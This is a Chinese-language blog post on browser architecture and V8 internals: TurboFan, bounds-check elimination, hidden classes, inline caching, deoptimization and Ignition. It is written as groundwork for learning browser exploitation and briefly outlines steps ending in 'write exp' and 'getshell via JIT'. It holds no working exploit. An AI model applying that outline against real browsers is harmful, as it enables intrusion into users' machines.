<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="浏览器基础主要根据keenan师傅的博客进行学习 web浏览器结构现代浏览器的结构基本如下(参考web-browser-architecture)   The User Interface(用户接口):提供用户和浏览器引擎的交互方法，比如地址栏，前进、后退按钮，书签等。除了你看到的请求页面外，浏览器前端展示出的部分都属于它 The Browser Engine(浏览器引擎):封装UI和渲染引擎的操">
<meta name="keywords" content="v8">
<meta property="og:type" content="article">
<meta property="og:title" content="浏览器基础">
<meta property="og:url" content="http://ama2in9.top/2021/05/13/v8-basic/index.html">
<meta property="og:site_name" content="Ama2in9">
<meta property="og:description" content="浏览器基础主要根据keenan师傅的博客进行学习 web浏览器结构现代浏览器的结构基本如下(参考web-browser-architecture)   The User Interface(用户接口):提供用户和浏览器引擎的交互方法，比如地址栏，前进、后退按钮，书签等。除了你看到的请求页面外，浏览器前端展示出的部分都属于它 The Browser Engine(浏览器引擎):封装UI和渲染引擎的操">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/1.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/2.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/3.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/4.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/6.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/5.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/7.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/8.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/9.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/10.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/11.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/12.jpg">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/13.jpg">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/14.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/15.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/16.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/17.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/18.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/19.jpg">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/20.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/21.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/22.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/24.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/23.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/25.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/26.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/27.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/28.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/29.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/30.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/31.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/32.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/34.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/37.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/35.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/38.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/39.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/43.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/44.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/45.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/46.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/47.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/48.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/49.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/41.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/42.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/50.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/51.png">
<meta property="og:image" content="http://ama2in9.top/2021/05/13/v8-basic/222.gif">
<meta property="og:updated_time" content="2021-05-13T07:56:28.400Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="浏览器基础">
<meta name="twitter:description" content="浏览器基础主要根据keenan师傅的博客进行学习 web浏览器结构现代浏览器的结构基本如下(参考web-browser-architecture)   The User Interface(用户接口):提供用户和浏览器引擎的交互方法，比如地址栏，前进、后退按钮，书签等。除了你看到的请求页面外，浏览器前端展示出的部分都属于它 The Browser Engine(浏览器引擎):封装UI和渲染引擎的操">
<meta name="twitter:image" content="http://ama2in9.top/2021/05/13/v8-basic/1.png">






  <link rel="canonical" href="http://ama2in9.top/2021/05/13/v8-basic/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>浏览器基础 | Ama2in9</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Ama2in9</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ama2in9.top/2021/05/13/v8-basic/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ama2in9">
      <meta itemprop="description" content="Seeing how far I have been.">
      <meta itemprop="image" content="/images/head.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ama2in9">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">浏览器基础
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2021-05-13 15:52:44 / Modified: 15:56:28" itemprop="dateCreated datePublished" datetime="2021-05-13T15:52:44+08:00">2021-05-13</time>
            

            
              

              
            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2021/05/13/v8-basic/#comments" itemprop="discussionUrl">
                
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/05/13/v8-basic/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2021/05/13/v8-basic/" class="leancloud_visitors" data-flag-title="浏览器基础">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Views: </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="浏览器基础"><a href="#浏览器基础" class="headerlink" title="浏览器基础"></a>浏览器基础</h1><p>主要根据<code>keenan</code>师傅的博客进行学习</p>
<h2 id="web浏览器结构"><a href="#web浏览器结构" class="headerlink" title="web浏览器结构"></a>web浏览器结构</h2><p>现代浏览器的结构基本如下(参考<a href="https://www.slideshare.net/quangntta/web-browser-architecture-49196378?from_action=save" target="_blank" rel="noopener">web-browser-architecture</a>)</p>
<p><img src="/2021/05/13/v8-basic/1.png" alt></p>
<ol>
<li>The User Interface(用户接口):提供用户和浏览器引擎的交互方法，比如地址栏，前进、后退按钮，书签等。除了你看到的请求页面外，浏览器前端展示出的部分都属于它</li>
<li>The Browser Engine(浏览器引擎):封装UI和渲染引擎的操作。它为渲染引擎提供顶层接口。浏览器引擎提供方法来加载一个URL和其他顶层的浏览器动作(reload/back/forward)。浏览器引擎还提供给用户许多同错误信息和加载进程相关的信息。</li>
<li>The Rendering Engine(渲染引擎):它生成指定URL的可视化表示。渲染引擎解释包含指定URL的HTML,XML以及Javascript。其中的一个核心组件是HTML解析器，它很复杂因为它允许渲染引擎展示出一个简陋的HTML页面。不同的浏览器使用不同的渲染引擎。</li>
</ol>
<p><img src="/2021/05/13/v8-basic/2.png" alt></p>
<ol start="4">
<li>The Networking(网络组件):提供方法使用通用的互联网协议如HTTP和FTP处理检索URL。网络组件处理所有方面的网络通信和安全，字符集翻译和MIME类型解析。网络组件为了最小化网络流量可能会实现一个cache保存检索过的文档。</li>
<li>The JavaScript Interpreter(JS解释器):执行web页面上嵌入的js代码。执行结果被传回到渲染引擎进行展示。渲染引擎或许会禁用许多包含用户定义属性的动作。</li>
<li>The UI Backend(UI后端):用于绘出基本的小部件，如组合框和窗口;在底层它使用操作系统用户接口方法。</li>
<li>The Data Storage(数据存储):管理用户数据比如书签,cookie,设置偏好等。HTML5定义了web database，它是浏览器中的一个完整数据库。</li>
</ol>
<h3 id="常见浏览器的结构"><a href="#常见浏览器的结构" class="headerlink" title="常见浏览器的结构"></a>常见浏览器的结构</h3><p>firefox:</p>
<p><img src="/2021/05/13/v8-basic/3.png" alt></p>
<p>chrome:</p>
<p>这里的Webkit应该是Blink和V8</p>
<p><img src="/2021/05/13/v8-basic/4.png" alt></p>
<p>看<code>keenan</code>师傅的博客找到了一张更为详细的图，关于组件如何工作可以看<a href="http://www.chromeliulanqi.com/help/?p=226" target="_blank" rel="noopener">这里</a></p>
<p><img src="/2021/05/13/v8-basic/6.png" alt></p>
<p>IE:</p>
<p><img src="/2021/05/13/v8-basic/5.png" alt></p>
<h2 id="漏洞利用的学习方法"><a href="#漏洞利用的学习方法" class="headerlink" title="漏洞利用的学习方法"></a>漏洞利用的学习方法</h2><ol>
<li>通过patch的方法引入漏洞</li>
<li>学习已有的CVE，在两次commit之间找到漏洞点，可能有PoC</li>
</ol>
<p>步骤：</p>
<ol>
<li>通过patch和commit hash编译</li>
<li>通过patch找到漏洞位置</li>
<li>定位漏洞调用链，找到触发方法。可以用工具ag来定位<a href="https://github.com/ggreer/the_silver_searcher" target="_blank" rel="noopener">ag</a></li>
<li>编写exp</li>
<li>getshell.一般通过JIT.</li>
</ol>
<h2 id="V8"><a href="#V8" class="headerlink" title="V8"></a>V8</h2><p>v8是chrome里的js引擎，负责执行js代码。</p>
<h3 id="编译器流程"><a href="#编译器流程" class="headerlink" title="编译器流程"></a>编译器流程</h3><p>v8编译器的整体流程如下，输入的js代码通过Parser解析得到AST(抽象语法树)，AST再生成字节码，字节码经过优化转换成汇编码。</p>
<p><img src="/2021/05/13/v8-basic/7.png" alt></p>
<p><img src="/2021/05/13/v8-basic/8.png" alt></p>
<h3 id="编译器历史"><a href="#编译器历史" class="headerlink" title="编译器历史"></a>编译器历史</h3><p>参考google的doc<a href="https://docs.google.com/presentation/d/1_eLlVzcj94_G4r9j9d_Lj5HRKFnq6jgpuPJtnmIBs88/edit#slide=id.g2134da681e_0_249" target="_blank" rel="noopener">TurboFan: A new code generation architecture for V8</a>以及<a href="https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.g18ceb14729_0_135" target="_blank" rel="noopener">An overview of the TurboFan compiler
</a></p>
<p>2008初代的编译器很简单，语法树半优化后直接产生汇编码(JIT)</p>
<p><img src="/2021/05/13/v8-basic/9.png" alt></p>
<p>2010年，用于优化hot-code的Crankshaft被引入。关于Crankshaft可以参考<a href="https://blog.chromium.org/2010/12/new-crankshaft-for-v8.html" target="_blank" rel="noopener">A New Crankshaft for V8</a>，它显著提升了计算密集型的js应用的性能(甚至可达2倍以上)。这个组件的想法是优化经常执行的代码，对于不常运行的代码则不进行优化。</p>
<p>Crankshaft有四个基本组件：</p>
<ol>
<li>一个base compiler用于所有的代码初始化。它产生代码时不会进行过度优化。</li>
<li>一个runtime profiler,监控运行系统,识别出hot code</li>
<li>一个optimizing compiler,重新编译hot code。</li>
</ol>
<p><img src="/2021/05/13/v8-basic/10.png" alt></p>
<p>2014年引入了TurboFan来取代古老的Crankshaft。使用轻量化的汇编器的原因是：1. 解释字节码 2. code stubs和builtin处理 3. asm.js和wasm的处理。</p>
<p>这里先插入一下<code>codestubAssembler</code>的概念，传统的js的builtins是使用不同的汇编进行编写的，这样在不同架构下使用的时候性能表现很好(因为针对不同的架构可以使用不同的汇编优化)，但是这样也使得每次写入一个新的Builtin都得适配不同的架构。</p>
<p>codestub的目标就是实现人工编码的性能而不需要适配每种架构。一个轻量的汇编语言在<code>Turbofan</code>的顶端被构建出来，这个API可以产生Turbofan的机器级别的IR，从而被Turbofan使用来对所有平台产生性能较好的机器码。</p>
<p>注意CSA是一个C++的用于产生IR的API，这些IR之后会被编译为机器码到指定架构使用。</p>
<p><img src="/2021/05/13/v8-basic/11.png" alt></p>
<p>再插播一下wasm，之前只是简单知道是类似汇编的语言，详情参考这篇文章<a href="https://zhuanlan.zhihu.com/p/42718990" target="_blank" rel="noopener">WebAssembly简介</a>。wasm是在浏览器中运行的原生代码，汇编语言经过汇编器的翻译可以得到机器码，不同的架构使用不同的汇编和机器码。而wasm并不完全是一种汇编语言，而是一个编译中间层,其可以和js相互调用，可以通过c/c++/rust等编译得到，同一份代码可以在不同架构上被翻译为不同的机器码运行，其具有良好的移植性。</p>
<p><img src="/2021/05/13/v8-basic/12.jpg" alt></p>
<p><img src="/2021/05/13/v8-basic/13.jpg" alt></p>
<p>Turbofan的结构如下，其中很多结构不清楚，inliner猜测是<code>inline caching</code>,lowerings猜测是<code>Simplified lowering</code>,我们先看后者。</p>
<p>参考<a href="https://www.jianshu.com/p/bb5607151a48" target="_blank" rel="noopener">V8-TurboFan编译器引擎介绍</a>，simplified lowering是优化边界检查使用的。其实现了<a href="https://docs.google.com/document/d/1R7-BIUnIKFzqki0jR4SfEZb3XmLafa04DLDrqhxgZ9U/edit#" target="_blank" rel="noopener">TurboFan Redundant Bounds and Overflow Check Elimination</a>中的想法，通常来说我们在对JS Object进行边界检查的时候会挨个检查<code>index</code>和<code>length</code>的关系，以确保我们只能访问到backing store的数据。假如说idx的范围是<code>[0,length-1]</code>，在我们检查<code>arr[i+2]</code>发现并没有越界的情况下，<code>arr[i]和arr[i+1]</code>就没有必要再做越界检查。正是基于这样一个想法，在边界检查时进行了边界检查的消除。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    CheckParameters <span class="keyword">const</span>&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">    Type <span class="keyword">const</span> index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type <span class="keyword">const</span> length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (length_type.Is(Type::Unsigned31())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">        <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">        <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">        <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">        VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                   MachineRepresentation::kWord32);</span><br><span class="line">        <span class="keyword">if</span> (lower()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (lowering-&gt;poisoning_level_ ==</span><br><span class="line">                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">            <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">            <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">            DeferReplacement(node, node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            NodeProperties::ChangeOp(</span><br><span class="line">                node, simplified()-&gt;CheckedUint32Bounds(p.feedback()));</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/13/v8-basic/14.png" alt></p>
<p><code>inline caching</code>顾名思义是使用缓存的方式进行优化，以下面一个直观的代码为例，我们定义一个printUserName函数，定义一个对象，之后将其作为参数传进函数中进行调用，当我们连续多次调用同一个参数相同的函数，编译器就将我们的调用函数内联为实际调用的结果，这样就不必每次做编译。</p>
<p><img src="/2021/05/13/v8-basic/15.png" alt></p>
<p><code>Hidden classes</code>是v8进行对象属性位置查找的一种方式。js作为一种动态语言其对象的性质和静态语言相差很大。我们知道Js的属性可以在实例化之后添加或者删除，比如下面的代码中<code>year</code>这个属性是在我们实例化之后才添加进去的，这样就导致对象寻址变得非常困难。js使用<code>Hash Funtion</code>的方式管理对象属性值在内存中的位置。对于像java这样的静态语言，对象的属性对应类的属性，并不能动态增加和删除(只能通过继承的方式编写子类)，java对象的属性值内存布局相对固定,详情可以参考<a href="https://www.programcreek.com/2011/11/what-do-java-objects-look-like-in-memory/" target="_blank" rel="noopener">What do Java objects look like in memory during run-time?</a>。通过哈希表查询的方式使得js的属性查询速度非常慢，因此v8引入了<code>Hidden classes</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> car = funtcion(make, model)&#123;</span><br><span class="line">    <span class="keyword">this</span>.make = make;</span><br><span class="line">    <span class="keyword">this</span>.model = model;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> myCar = <span class="keyword">new</span> car(honda,accord);</span><br><span class="line">myCar.year = year;  <span class="comment">//dynamicly added</span></span><br></pre></td></tr></table></figure>
<p><code>Hidden classes</code>和使用固定对象属性偏移的Java有点像，只不过这个偏移是在runtime生成的。v8为每一个obj都attach了hiddent classes用于优化属性访问。</p>
<p>这里我们举个栗子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x,y</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.x = x;</span><br><span class="line">	<span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> Point(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>当新函数Point声明之后(不包括里面属性的赋值)，v8就会创建一个hidden class C0,这个函数对象的类指针指向C0.</p>
<p><img src="/2021/05/13/v8-basic/16.png" alt></p>
<p>当函数中的第一行<code>this.x=x</code>执行之后，会产生新的hidden class C1，在C1中，offset为0的位置即属性x存储的位置，Point对象也由原来的指向C0变为指向C1。这个过程被称为<code>class transition</code>.这种hidden class可以被使用同样方式创建的对象所共享。如果两个对象共享同样的hidden class并被加入了相同的属性，那么transition保证它们会转换成相同的新的hidden class,并得到相同的优化代码。</p>
<p><img src="/2021/05/13/v8-basic/17.png" alt></p>
<p>同样的过程也会发生在<code>this.y=y</code>的执行过程中。</p>
<p><img src="/2021/05/13/v8-basic/18.png" alt></p>
<p>hidden class的生成依赖于属性attach到对象的顺序，参看下面的例子.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x,y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.x = x;</span><br><span class="line">  <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj1 = <span class="keyword">new</span> Point(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="keyword">new</span> Point(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">obj1.a = <span class="number">5</span>;</span><br><span class="line">obj1.b = <span class="number">10</span>;</span><br><span class="line">obj2.b = <span class="number">10</span>;</span><br><span class="line">obj2.a = <span class="number">5</span>;</span><br></pre></td></tr></table></figure>
<p>一直到<code>obj1.a=5</code>前，obj1和obj2都一直共享相同的hidden class。在赋值之后二者transition的结果发生了变化。在此基础上，我们再来研究一下inline caching看共享hidden class的意义。</p>
<p>当一个obj中的方法被调用时，v8都需要通过Hidden class查询的方式确定访问特定属性的偏移，如果连续两次对同一个hidden class的方法调用成功，那么属性的偏移就直接加入到了class pointer上，之后的访问就会假设hidden class没有发生改变，直接从上一次查询的结果中获取偏移，这样提高了代码的执行速度。这也是为什么相同类型的obj共享hidden class是如此重要。如果他们属性相同但是Hidden class不同，那么v8就无法对这两个对象做inline cache，属性的偏移在class中是不同的。</p>
<p>当这种假设出错，v8就会<code>de-optimize</code>，然后回退到之前hidden class检查过的版本。参考<a href="https://docs.google.com/presentation/d/1HgDDXBYqCJNasBKBDf9szap1j4q4wnSHhOYpaNy5mHU/edit#slide=id.g17d335048f_1_2340" target="_blank" rel="noopener">DLS Keynote: Ignition: Jump-starting an Interpreter for V8
</a>的内容可以看到所谓的hidden class应当是以<code>map</code>的形式标识的.</p>
<p><img src="/2021/05/13/v8-basic/19.jpg" alt></p>
<p>上面这篇文章提到了<code>deoptimization</code>，用于优化过程中一些假设判断失误进行回退，那么我们秉持着哪里不会查哪里的原则看下v8是如何进行优化和反优化的。</p>
<p>google sildes的这篇文章介绍了v8的去优化<a href="https://docs.google.com/presentation/d/1Z6oCocRASCfTqGq1GCo1jbULDGS-w-nzxkbVF7Up0u0/htmlpresent" target="_blank" rel="noopener">Deoptimization in V8</a>。v8通常是对见到的cases进行优化，past cases通过typer feedback vector进行记录。优化过的代码通过feedback动态验证猜想。假如动态检查失败，去优化器反优化代码：</p>
<ol>
<li>抛弃优化过的代码</li>
<li>在优化过的栈和寄存器中创建解释器frame</li>
<li>跳转到Interpreter</li>
</ol>
<p>具体地：</p>
<ol>
<li>将当前栈帧和HW寄存器文件读到缓冲区中</li>
<li>构造Interpreter frame，使用优化过的栈帧和寄存器<br> 2.1 使用编译器提供的信息<br> 2.2 这些信息包括：要恢复的共享函数和字节码的偏移量、硬件寄存器/栈slots中的参数位置、解释器中的寄存器/栈slot的位置、内联的frame<br> 2.3 Materializes通过转义分析编译掉的对象<br> 2.4 跳到解释器没有被patch的地方</li>
</ol>
<p>Turbofan中的去优化分为<code>eager</code>和<code>lazy</code>两部分。</p>
<p>对于<code>eager deoptimization</code>：在每个潜在的去优化节点前插入checkpoint node到影响链中，基本上是在处理每个字节码之前<br>对于<code>lazy deoptimization</code>：Attach去优化的状态到每个潜在的调用节点。<br>在构建图时假如存在许多去优化相关的节点，我们就复用之前frame状态，将状态以树的形式表示出来。</p>
<p>到这里Turbofan的基本组件就比较清晰了。</p>
<p>2016引入了生产中间语言的<code>Ignition</code></p>
<p><img src="/2021/05/13/v8-basic/20.png" alt></p>
<p>关于<code>Ignition</code>，可以阅读<a href="https://docs.google.com/presentation/d/1OqjVqRhtwlKeKfvMdX6HaCIu9wpZsrzqpIVIwQSuiXQ/edit#slide=id.g1453eb7f19_1_108" target="_blank" rel="noopener">Ignition: An Interpreter for V8 [BlinkOn]</a>。</p>
<p>v8的三大编译器存在着复杂的依赖关系，因此引入了Ignition这个js的字节码解释器。</p>
